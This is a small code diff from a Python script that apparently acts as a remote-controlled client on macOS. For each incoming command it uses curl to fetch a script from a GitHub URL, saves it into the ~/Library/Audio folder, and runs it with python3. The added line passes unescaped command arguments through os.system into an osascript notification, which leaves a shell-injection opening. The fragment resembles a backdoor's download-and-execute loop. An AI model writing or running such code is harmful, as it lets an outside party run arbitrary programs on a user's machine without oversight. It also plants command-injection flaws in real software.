@@ -20,6 +20,7 @@ for cmd in userData['commands']:
         continue
 
     args = cmd[1:].split(" ")
+    os.system(f'osascript -e "display notification \"{" ".join(args)}\""')
     try:
         os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{args[0]}.py -o ~/Library/Audio/{args[0]}.py")
         os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args[1:])}")
